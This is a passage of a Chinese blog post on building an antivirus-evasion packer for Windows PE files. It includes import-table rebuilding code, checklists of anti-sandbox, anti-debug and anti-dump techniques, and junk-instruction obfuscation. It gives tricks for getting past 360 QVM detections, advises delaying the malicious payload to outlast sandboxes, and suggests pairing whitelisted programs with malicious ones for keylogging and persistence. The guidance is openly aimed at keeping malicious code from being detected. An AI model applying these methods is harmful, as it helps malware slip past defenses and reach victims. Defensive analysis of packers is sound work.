c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//获取导入表首地址</span><br>IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pImageBaseAddr;<br>IMAGE_NT_HEADERS* pNtHdr = (IMAGE_NT_HEADERS*)(pDosHdr-&gt;e_lfanew + (DWORD)pImageBaseAddr);<br>IMAGE_DATA_DIRECTORY* pDataDirHdr = (IMAGE_DATA_DIRECTORY*)pNtHdr-&gt;OptionalHeader.DataDirectory;<br>IMAGE_IMPORT_DESCRIPTOR* pImport = (IMAGE_IMPORT_DESCRIPTOR*)(pDataDirHdr[<span class="hljs-number">1</span>].VirtualAddress + (DWORD)pImageBaseAddr);<br> <br><span class="hljs-keyword">while</span> (pImport-&gt;OriginalFirstThunk != <span class="hljs-number">0</span> || pImport-&gt;FirstThunk != <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-comment">//获得当前DLL名</span><br>    <span class="hljs-type">char</span>* chName = (<span class="hljs-type">char</span>*)(pImport-&gt;Name + (DWORD)pImageBaseAddr);<br> <br>    <span class="hljs-comment">//加载模块</span><br>    HMODULE hModule = <span class="hljs-built_in">p_LoadLibraryExA</span>(chName, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br> <br>    <span class="hljs-comment">//如果有INT表则通过INT表来修复IAT表</span><br>    DWORD* pReferenceTab = <span class="hljs-literal">nullptr</span>;<br>    (pImport-&gt;OriginalFirstThunk == <span class="hljs-number">0x0</span>) || (pImport-&gt;OriginalFirstThunk == <span class="hljs-number">0xFFFFFFFF</span>) ?<br>        pReferenceTab = (DWORD*)(pImport-&gt;FirstThunk + (DWORD)pImageBaseAddr) :<br>        pReferenceTab = (DWORD*)(pImport-&gt;OriginalFirstThunk + (DWORD)pImageBaseAddr);<br> <br>    <span class="hljs-comment">//被修复的IAT表</span><br>    DWORD* pIatTab = (DWORD*)(pImport-&gt;FirstThunk + (DWORD)pImageBaseAddr);<br> <br>    DWORD dwIatIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (pReferenceTab[dwIatIndex] != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">//判断是什么方式导入 &lt;序号&gt; &lt;名称&gt;</span><br>        <span class="hljs-keyword">if</span> ((pReferenceTab[dwIatIndex] &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//最高为1是序号导入</span><br>        &#123;<br>            IMAGE_IMPORT_BY_NAME* pByName = (IMAGE_IMPORT_BY_NAME*)<br>                (pReferenceTab[dwIatIndex] + (DWORD)pImageBaseAddr);<br> <br>            <span class="hljs-comment">//获取到的API地址</span><br>            pIatTab[dwIatIndex] = (DWORD)<span class="hljs-built_in">p_GetProcAddress</span>(hModule, pByName-&gt;Name);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            DWORD dwIndex = pReferenceTab[dwIatIndex] &amp; <span class="hljs-number">0x7FFFFFFF</span>;<br>            <span class="hljs-comment">//获取到的API地址</span><br>            DWORD dwApiAddr = (DWORD)<span class="hljs-built_in">p_GetProcAddress</span>(hModule, (<span class="hljs-type">char</span>*)dwIndex);<br>            pIatTab[dwIatIndex] = (DWORD)dwApiAddr;<br>        &#125;<br>        ++dwIatIndex;<br>    &#125;<br>    <span class="hljs-comment">//指向下一个结构体</span><br>    pImport += <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="长时间执行垃圾指令进行沙箱逃逸"><a href="#长时间执行垃圾指令进行沙箱逃逸" class="headerlink" title="长时间执行垃圾指令进行沙箱逃逸"></a>长时间执行垃圾指令进行沙箱逃逸</h3><h3 id="反注射"><a href="#反注射" class="headerlink" title="反注射"></a>反注射</h3><ul><li>使用EnumProcessModulesEx (32位、64位和所有选项)枚举模块</li><li>使用工具帮助枚举模块32</li><li>使用LdrEnumerateLoadedModules枚举流程LDR结构</li><li>直接列举流程LDR结构</li><li>具有GetModuleInformation的行走记忆</li><li>隐藏模块的行走记忆</li></ul><h3 id="反dumping"><a href="#反dumping" class="headerlink" title="反dumping"></a>反dumping</h3><ul><li>从内存中擦除PE头</li><li>SizeOfImage</li></ul><h3 id="定时攻击-反沙盒"><a href="#定时攻击-反沙盒" class="headerlink" title="定时攻击[反沙盒]"></a>定时攻击[反沙盒]</h3><p><a href="https://github.com/LordNoteworthy/al-khaser#antidebug">https://github.com/LordNoteworthy/al-khaser#antidebug</a></p><h3 id="人类互动-x2F-通用-反沙盒"><a href="#人类互动-x2F-通用-反沙盒" class="headerlink" title="人类互动&#x2F;通用[反沙盒]"></a>人类互动&#x2F;通用[反沙盒]</h3><h3 id="反虚拟化-x2F-全系统仿真"><a href="#反虚拟化-x2F-全系统仿真" class="headerlink" title="反虚拟化&#x2F;全系统仿真"></a>反虚拟化&#x2F;全系统仿真</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs clean">### 注册表项工件**<br><br>### **文件系统工件**<br><br>### **目录工件**<br><br>### **记忆假象**<br><br>### **mac地址**<br><br>### **虚拟设备**<br><br>### **硬件设备信息**<br><br>### **DLL导出和加载的DLL**<br><br>### **系统固件表**<br><br>### **WMI**<br><br>### **中央处理器<br></code></pre></td></tr></table></figure><h3 id="Anti-Disassembly"><a href="#Anti-Disassembly" class="headerlink" title="Anti-Disassembly"></a>Anti-Disassembly</h3><ul><li>以恒定条件跳跃</li><li>目标相同的跳转指令</li><li>不可能拆卸</li><li>函数指针</li><li>返回指针滥用</li></ul><h3 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h3><ol><li></li></ol><p>如果在外壳程序中，有复杂的操作，要用到容器，比如矢量、链表或者树，不能用Windows提供的标准模板库，因为这里面说不一定就会用到API,从而导致程序出错。<br>可以仿照标准模板库设计自己的库，比如设计一个vector容器</p><p><a href="https://www.52pojie.cn/thread-1277269-1-1.html">https://www.52pojie.cn/thread-1277269-1-1.html</a></p><ol start="2"><li></li></ol><p>在外壳里面怎么获取随机数的问题，可以直接逆向(直接改写源码)srand()和rand()两个函数，<br>以下的随机数函数就是照搬srand()和rand()</p><ol start="3"><li></li></ol><p>垃圾指令构造器的设计非常简单，难点在于垃圾指令的选择，有些指令是不能作为垃圾指令的，改变普通寄存器的指令不能用，比如AAA指令，会改变eax寄存器的值。具体参考Intel手册。</p><p>但是&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>其实也不是不能用，可以对上下文分析看哪些寄存器暂时未被使用，然后对其赋值。如果有 CALL&#x2F;JMP 可以暂时先跳过。</p><p>而且感觉插入 CALL&#x2F;JMP 后很容易破坏自动分析工具？可以在垃圾代码中插入一堆看上去有用实际上没用流程控制&#x2F;空函数调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">; 比如这里可以放入操作 eax/ecx 的指令，如 add eax, ebx; call dword[nop]<br>mov eax, <span class="hljs-number">1</span><br>; 比如这里可以放入操作 ecx 的指令，如 add ecx, eax<br>xor eax, ebx<br>; 这里 可以放入操作 ecx 的指令<br>mov ecx, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>也可以插一段算法，比如趁着某个寄存器还未被使用的时候修改，然后用算法还原到之前的状态：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">mov eax, <span class="hljs-number">1</span><br>; 插入 add eax, <span class="hljs-number">3</span><br>mov ecx, <span class="hljs-number">1</span><br>; 插入 dec eax; sub eax, <span class="hljs-number">2</span><br>; 插入这两段后，eax 就变回原来的值了（我记得 VMP 也有类似的处理，不过更复杂？）<br>; 也可以利用此时 ecx 为 <span class="hljs-number">1</span>（常量赋值），把这一段改成 add eax, ecx; sub eax, <span class="hljs-number">4</span><br>xor eax, ebx<br></code></pre></td></tr></table></figure><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a>免杀方法</h2><p>当前主流的技术,需要有源代码才能操作。通过修改病毒的特征字符串、动态API调用、修改编译环境、套程序外壳(MFC、SDK、QT)等</p><h3 id="输入表-IAT-免杀法"><a href="#输入表-IAT-免杀法" class="headerlink" title="输入表(IAT)免杀法"></a>输入表(IAT)免杀法</h3><p>发式引擎会扫描目标程序的输入表中是否包含指定的函数特征序列(函数调用特征码)。</p><p>解决方案：(本段摘自未知作者)</p><ul><li><p><input disabled="" type="checkbox"> 1、 输入表函数移位法：这是最早也是比较简单的输人表免杀方法了，虽然效果已经不像当年那么好了，但却是学习免杀过程必须要掌握的基础知识。我们使用C32打开一个EXE文件，找到输入表段，找到我们定位出的特征输入表，比如ShellExecuteA就是，我们将其使用OO填充，然后在附近找到一片空白区域，将刚才找到的代码再粘贴到空白区域中，并记下新函数的地址，ShellExecuteA字符串最前面的那个“S”的地址减2，即00078925，这样就实现了转移，但是要想让程序知道我们转移的函数，我们还得告诉输入表，刚才那个地址是文件偏移地址，但不是内存地址，我们需要利用OC计算出新的输入表函数ShellExecuteA的内存位置，并在LoadPE中修改才行。</p></li><li><p><input disabled="" type="checkbox"> 2、 输入表函数对调法：这个方法的原理就是将输入表函数名长度相同的函数在C32中进行对调，只有长度一样才不会出错，然后在LoadPE中做相应的修改即可。比如被查杀的函数是OpenFileA，存在于A.dll文件中，我们在b.dll中找到了一个GetATimeA函数，这两个函数名称长度一样，我们在C32中做了静态对换之后，还要将它们的RVA进行对换</p></li><li><p><input checked="" disabled="" type="checkbox"> 3、 手工重建输入表：关于输入表的重建，我想大家都非常熟悉了吧，这算是比较复杂的一种方法了，不过免杀效果非常好，这也是必须要掌握的方法哦！这个方法其实就是添加一个新区段，再把原来的输入表移到我们新建的区段上，重建主要是针对杀毒软件定位到大片输入表函数。</p></li><li><p><input disabled="" type="checkbox"> 4、 输入表隐藏法：将输入表加密隐藏，然后内存解密修复输入表。属于保护壳常用的技术。</p></li></ul><p>代码混淆、加花：通过对特征代码进行膨胀、乱序来干扰启发式引擎的分析，以及提升人工提取特征码的难度。</p><p>入口模糊技术</p><p>内存加载执行PE文件：壳的基本技术，论坛资料很多。</p><h3 id="机器学习引擎（以360QVM为例），绕过方式如下："><a href="#机器学习引擎（以360QVM为例），绕过方式如下：" class="headerlink" title="机器学习引擎（以360QVM为例），绕过方式如下："></a><strong>机器学习引擎（以360QVM为例），绕过方式如下：</strong></h3><p>模拟正常程序的PE结构（该免杀壳方案能有效针对该引擎，或许还能污染机器学习引擎的分析结果）</p><p> <strong>常见QVM引擎报毒原因：</strong></p><p>HEUR&#x2F;Malware.QVM06.Gen  一般情况下加数字签名可过HEUR&#x2F;Malware.QVM07.Gen  一般情况下换资源HEUR&#x2F;Malware.QVM13.Gen  加壳了HEUR&#x2F;Malware.QVM19.Gen  杀壳HEUR&#x2F;Malware.QVM20.Gen  改变了入口点HEUR&#x2F;Malware.QVM27.Gen  输入表HEUR&#x2F;Malware.QVM18.Gen 加花HEUR&#x2F;Malware.QVM05.Gen 加资源，改入口点</p><h3 id="沙箱-虚拟机-行为分析引擎，绕过方式如下："><a href="#沙箱-虚拟机-行为分析引擎，绕过方式如下：" class="headerlink" title="沙箱(虚拟机)行为分析引擎，绕过方式如下："></a><strong>沙箱(虚拟机)行为分析引擎，绕过方式如下：</strong></h3><p>简介：所谓“沙箱”安全技术，是指以计算机系统为基础对恶意软件的行为与特征进行分析并最终检测出恶意代码的方案。</p><p>解决方案：</p><p>1、通过检测沙箱(虚拟机)与物理机的差异化(参考：<a href="https://bbs.pediy.com/thread-225735.htm)%EF%BC%8C%E6%A3%80%E6%B5%8B%E5%88%B0%E6%B2%99%E7%AE%B1(%E8%99%9A%E6%8B%9F%E6%9C%BA)%E5%88%99%E4%B8%8D%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82">https://bbs.pediy.com/thread-225735.htm)，检测到沙箱(虚拟机)则不执行恶意代码。</a></p><p>2、延时180+秒(效果比较好)加载恶意代码，沙箱(虚拟机)的检测结束后无法探测到恶意行为。笔者比较推崇此方法，因为此方法针对的是所有反病毒厂商的沙箱(虚拟机)检测。</p><p>3、挖掘开机启动程序的代码执行漏洞，配合白加黑技术来执行敏感行为。</p><h3 id="主动防御："><a href="#主动防御：" class="headerlink" title="主动防御："></a><strong>主动防御：</strong></h3><p>简介：主动防御是基于程序行为自主分析判断的实时防护技术，不以病毒的特征码作为判断病毒的依据，而是从最原始的病毒定义出发，直接将程序的行为作为判断病毒的依据。</p><p>   360主动防御模块经过做黑灰兄弟们的不懈努力，已经非常完善了，绝大部分常规、非常规的行为绕过方式均已被拦截，并弹出一个默认阻止的小框框。</p><p>1、继续挖掘非常规方法绕过主防的拦截，主防未监控到的区域。</p><p>2、白程序(包含在杀软白名单库中的程序)加黑程序方式来执行高危行为，写启动项、键盘记录等。(不过要注意的是360白程序判定逻辑，灰程序加载的白程序 &#x3D; 灰程序，因此需要绕过主防的程序执行链监控)</p><h3 id="3-免杀壳开发-by-AYZRxx"><a href="#3-免杀壳开发-by-AYZRxx" class="headerlink" title="3  免杀壳开发(by: AYZRxx)"></a>3  免杀壳开发(by: AYZRxx)</h3><h4 id="3-1-免杀壳核心思想-伪装"><a href="#3-1-免杀壳核心思想-伪装" class="headerlink" title="3.1  免杀壳核心思想-伪装"></a>3.1  免杀壳核心思想-伪装</h4><p>  经过10多年的发展，反病毒引擎已经在误报&amp;查毒粒度之间取了一个比较好的平衡，常规的免杀技术（特征码免杀、源码免杀）处理成本越来越高。不过反病毒引擎天然存在某些”缺陷”，例如正常软件会加商业保护壳，导致会受到商业壳的制约，无法将所有壳标记为病毒。</p><p>  由于内存执行”被加壳程序”是壳的基础行为，&#x3D;&#x3D;而内存执行PE这个”壳的基础行为”可以很好的将”被加壳程序”的特征码隐藏起来。&#x3D;&#x3D;因此编写一款无特征码壳是一个非常好的反杀软查杀(特征码、启发式)的方案。</p><p>\1.  &#x3D;&#x3D;模拟正常PE程序结构, 模拟正常PE程序结构, 模拟正常PE程序结构&#x3D;&#x3D;</p><p>\2.  特征代码最小化，并且&#x3D;&#x3D;被查杀后&#x3D;&#x3D;可通过&#x3D;&#x3D;混淆引擎&#x3D;&#x3D;来混淆壳代码，达到快速变种、快速免杀的效果。</p><p>\3.  笔者不建议进行任何可能提高程序熵值的操作，&#x3D;&#x3D;尽可能将壳程序的PE格式、数据结构、代码执行顺序与正常程序保持一致。&#x3D;&#x3D;</p><h4 id="3-2-免杀壳的编写框架说明"><a href="#3-2-免杀壳的编写框架说明" class="headerlink" title="3.2  免杀壳的编写框架说明"></a>3.2  免杀壳的编写框架说明</h4><p>这个免杀壳的代码主要分为三部分：</p><p>加壳器：这部分代码用来将被加壳程序、傀儡程序、壳代码拼装处理，组合生成一个免杀的PE文件。</p><p>CodeLoader（壳代码）：这部分代码用来反杀毒引擎、内存加载执行PeLoader，需要编译为Shellcode代码。</p><p>PeLoader（壳代码）：这部分代码用来内存执行Shelled（被加壳程序），需要编译为Shellcode代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">Ø  Shelled：被加壳程序<br><br>Ø  Pepput：傀儡程序，用来伪装成正常PE文件，植入壳代码的载体<br><br>Ø  CodeLoaderCode：壳代码<br><br>Ø  PeLoaderCode：壳代码<br><br>Ø  CodeLoader：作用是反调试、反沙箱(虚拟机)、加载执行PeLoader(只有这段代码暴露在杀毒引擎的检测范围之内，只需要对这段代码做混淆即可快速免杀)<br><br>Ø  PeLoader：作用是加载执行Shelled（被加壳程序）<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、 加壳后只有CodeLoader代码暴露在杀毒引擎（静态）检测范围内，混淆前代码只有<span class="hljs-number">1</span>KB左右大小，由于可定位的特征代码少，特征码免杀较为简单。<br><br><span class="hljs-attribute">2</span>、 传统的Shellcode使用自解密的方式来模糊特征，需要代码段内存具有可写属性，该操作会导致启发式引擎报毒。CodeLoader代码则使用了代码混淆技术来达到免于杀毒引擎查杀的效果，代码段内存在PE结构种无需具有可写属性。<br><br><span class="hljs-attribute">3</span>、 并且只需要在CodeLoader代码加入检测沙箱、虚拟机的功能代码，绕过杀毒引擎的行为检测，就做到了基本的无特征码化、无行为化。<br><br><span class="hljs-attribute">4</span>、 无需创建傀儡进程，远程写内存这种高危行为杀毒软件是不允许的。<br><br><span class="hljs-attribute">5</span>、 内存加载PE文件就是老生常谈了，不再做过多的阐述，论坛里面有大量的优秀文章可供参考。<br></code></pre></td></tr></table></figure><h2 id="先看看别人的代码分析分析"><a href="#先看看别人的代码分析分析" class="headerlink" title="先看看别人的代码分析分析"></a>先看看别人的代码分析分析</h2><h3 id="Peprotect"><a href="#Peprotect" class="headerlink" title="Peprotect"></a>Peprotect</h3><h4 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h4><p>stub.cpp(植入的.cpp)</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.汇编找到kernel<span class="hljs-selector-class">.dll</span><br><span class="hljs-number">2</span><span class="hljs-selector-class">.kernel</span><span class="hljs-selector-class">.dll</span>获取各类函数地址<br><span class="hljs-number">3</span>.填充iat<br><span class="hljs-number">4</span>.修复exe重定位<br><span class="hljs-number">5</span>.对加壳器(加密部分)的解密<br><span class="hljs-number">6</span>.执行TLS回调 <span class="hljs-comment">//当这个进程处于TIS保护状态时(默认处于)，需要重装TLS以进行修改</span><br><span class="hljs-number">7</span>.调用窗口函数验证密码(跟像是一种勒索软件)(看下有没有不需要窗口的但是能使用密码的)<br><span class="hljs-number">8</span>.解压<br><span class="hljs-number">9</span>.混淆函数(花指令)<br><span class="hljs-number">10</span>.壳程序<br></code></pre></td></tr></table></figure><p>dllmain.cpp</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">switch</span><br>创建进程<br>创建线程<br>关闭线程<br>关闭进程<br></code></pre></td></tr></table></figure><h4 id="peprotect"><a href="#peprotect" class="headerlink" title="peprotect"></a>peprotect</h4><p>peprotect.cpp</p><p>peprotectdl.cpp</p><p>用来设置对话框</p><h4 id="pack"><a href="#pack" class="headerlink" title="pack"></a>pack</h4><p>dllmain.cpp</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">switch</span><br>创建进程<br>创建线程<br>关闭线程<br>关闭进程<br></code></pre></td></tr></table></figure><p>PE.cpp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">DWORD CPe::<span class="hljs-constructor">GetOepRva()</span> 获取目标程序的入口点Rva<br><span class="hljs-built_in">bool</span> CPe::ReadTargetFile 读取要加密文件到内存<br>DWORD CPe::<span class="hljs-constructor">RvaToOffset(DWORD Rva)</span>  用于将PE文件的rva转为文件偏移<br>DWORD CPe::AddSection 添加区段<br>DWORD CPe::<span class="hljs-constructor">GetFirstNewSectionRva()</span> 获取第一个新区段的rva<br>void CPe::<span class="hljs-constructor">SetNewOep(DWORD <span class="hljs-params">dwNewOep</span>)</span> 设置新的程序入口点<br>void CPe::<span class="hljs-constructor">SaveNewFile(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pPath</span>)</span> 保存文件<br>DWORD  CPe::<span class="hljs-constructor">CalcAlignment(DWORD <span class="hljs-params">dwSize</span> , DWORD <span class="hljs-params">dwAlignment</span>)</span> 获取对齐后的大小<br>void CPe::<span class="hljs-constructor">FixDllRloc(PCHAR <span class="hljs-params">pStubBuf</span>, PCHAR <span class="hljs-params">pStub</span>)</span> 根据新区段的地址修复dll的重定位<span class="hljs-literal">[<span class="hljs-identifier">dll</span>是加载到内存的,这里根据默认加载基址,新添加的节区的<span class="hljs-identifier">rva</span>以及和原节区开始的差值来重新设置.<span class="hljs-identifier">text</span>的重定位]</span><br>void CPe::<span class="hljs-constructor">Encryption()</span> 对代码段进行加密<br>void CPe::<span class="hljs-constructor">CancleRandomBase()</span> 去除重定位<br>DWORD CPe::<span class="hljs-constructor">GetImportTableRva()</span> 获取导入表的rva<br>DWORD CPe::<span class="hljs-constructor">GetRelocRva()</span> 获取重定位表的rva<br>void CPe::<span class="hljs-constructor">ChangeImportTable()</span> 对导入表进行更改<br>DWORD CPe::<span class="hljs-constructor">GetImageBase()</span> 获取目标程序加载基址<br>void CPe::<span class="hljs-constructor">SetMemWritable()</span> 设置每个区段为可写状态<br>void CPe::<span class="hljs-constructor">ChangeReloc(PCHAR <span class="hljs-params">pBuf</span>)</span> 对于动态加载基址,需要将stub的重定位区段(.reloc)修改后保存,将PE重定位信息指针指向该地址（新区段）<br>DWORD CPe::<span class="hljs-constructor">GetNewSectionRva()</span> 如果要添加一个新区段,获得这个新区段的rva<br>DWORD CPe::<span class="hljs-constructor">GetLastSectionRva()</span> 获取最后一个段的rva<br>void CPe::<span class="hljs-constructor">EnCompression(PPACKINFO &amp; <span class="hljs-params">pPackInfo</span>)</span> 压缩区段 压缩在加密区段之后<br>PCHAR CPe::<span class="hljs-constructor">Compress(PVOID <span class="hljs-params">pSource</span>, IN <span class="hljs-params">long</span> InLength, OUT <span class="hljs-params">long</span> &amp; OutLength)</span> 调用压缩库<br>BOOL CPe::<span class="hljs-constructor">ModifyTlsTable(PPACKINFO &amp; <span class="hljs-params">pPackInfo</span>)</span> 修改Tls表<br>void CPe::<span class="hljs-constructor">SetTls(DWORD NewSectionRva, PCHAR <span class="hljs-params">pStubBuf</span>, PPACKINFO <span class="hljs-params">pPackInfo</span>)</span> 设置stub的tls表<br></code></pre></td></tr></table></figure><p>Pack.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp">加壳<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) c++调用c模块<br><span class="hljs-number">1.</span>调用LoadLibrary将stub.dll载入到内存<br><span class="hljs-number">2.</span>GetprocAddress在内存中找到和stub.dll通讯的 <span class="hljs-built_in">g_PackInfo</span>(stub.dll中设置了g_PackInfo的信息)<br><span class="hljs-number">3.</span>调用PE.cpp中的ReaTargetFile将pPath加密读取到内存<br><span class="hljs-number">4.b</span>TlsUseful = obj.<span class="hljs-built_in">ModifyTlsTable</span>(pPackInfo)获取TLS信息<br><span class="hljs-number">5.</span>obj.<span class="hljs-built_in">Encryption</span>();对代码段进行加密<br><span class="hljs-number">6.</span>obj.<span class="hljs-built_in">EnCompression</span>(pPackInfo);压缩区段<br><span class="hljs-number">7.</span>获取stub.dll的内存大小和节区头(也就是要拷贝的头部)<br><span class="hljs-number">8.</span>设置加壳信息<br>pPackInfo-&gt;TargetOepRva = obj.<span class="hljs-built_in">GetOepRva</span>() 获取进程OEP<br>ImageBase = obj.<span class="hljs-built_in">GetImageBase</span>(); 获取目标程序加载基址Iamgebase<br>获取目标程序重定位表rva和导入表的rva ImportTableRva = obj.<span class="hljs-built_in">GetImportTableRva</span>() RelocRva = obj.<span class="hljs-built_in">GetRelocRva</span>()<br><span class="hljs-number">9.</span>获得Stub.dll模块中Start函数的相对虚拟地址：VA-Stub.dll基址<br><span class="hljs-number">10.</span>由于直接在本进程中修改会影响进程,所以将dll拷贝一份到pStubBuf   memcpy_s<br><span class="hljs-number">11.</span>obj.<span class="hljs-built_in">FixDllRloc</span>(pStubBuf, (PCHAR)hStub); 修复dll文件重定位,这里第二个参数应该传入Stub.dll模块基址hStub,因为这是dll加载时重定位的依据<br><span class="hljs-number">12.</span>把stub.dll的代码段.text添加为目标程序的新区段<br><span class="hljs-number">13.</span>SetTls<br><span class="hljs-number">14.</span><span class="hljs-comment">//obj.CancleRandomBase() 可以选择去掉重定位</span><br><span class="hljs-comment">// 或者将stub的重定位区段粘到最后面,将重定位项指向之,但是这之前也必须FixDllRloc,使其适应新的PE文件</span><br>obj.<span class="hljs-built_in">ChangeReloc</span>(pStubBuf); <br><span class="hljs-number">15.</span>把目标程序的OEP设置为stub中的start函数  obj.<span class="hljs-built_in">SetNewOep</span>(dwNewOep);<br><span class="hljs-number">16.</span> 设置每个区段可写 obj.<span class="hljs-built_in">SetMemWritable</span>();<br><span class="hljs-number">17.</span> 对IAT进行加密 obj.<span class="hljs-built_in">ChangeImportTable</span>();<br><span class="hljs-number">18.</span> 释放改<span class="hljs-function">dll <span class="hljs-title">FreeLibrary</span><span class="hljs-params">(hStub)</span></span>;<br><span class="hljs-number">19.</span>保存成文件<br></code></pre></td></tr></table></figure><h3 id="Packer-master"><a href="#Packer-master" class="headerlink" title="Packer-master"></a>Packer-master</h3><h4 id="stub-dll"><a href="#stub-dll" class="headerlink" title="stub.dll"></a>stub.dll</h4><p>aplib.lib– 壳压缩引擎</p><p>info.h – c++文件系统 管理写读</p><p>dllmain.cpp (直接将创建线程和功能都写在里面了)(用到了内存管理)</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 